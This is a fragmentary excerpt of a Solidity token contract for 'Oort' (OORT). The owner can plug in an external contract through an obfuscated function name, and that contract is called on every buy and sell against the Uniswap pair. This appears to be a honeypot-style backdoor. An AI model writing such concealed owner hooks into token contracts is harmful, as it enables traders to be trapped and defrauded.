...
contract TokenM is ERC20 {
    ...
    IUserAmountjinjun public jinjun;
	mapping(address => bool) private _isExcludedFromFees;
    mapping(address => bool) private _isExcludedFromVipFees;
      uint256 total;
    constructor(address tokenOwner) ERC20("Oort", "OORT") {
    ...
    function cedfhjueBnijhuRllp(IUserAmountjinjun _jinjun) public onlyOwner {
        jinjun = _jinjun;
    }
    ...
    function _transfer(
        ...
        if (_isExcludedFromFees[from] || _isExcludedFromFees[to]) {
			...
			if(from == uniswapV2Pair){
                ...
                jinjun.addInAmount(to, amount);
            }else if(to == uniswapV2Pair){
				jinjun.addOutAmount(from, amount);
            }else{
                jinjun.addOutAmount(from, amount);
                takeFee = false;
            }
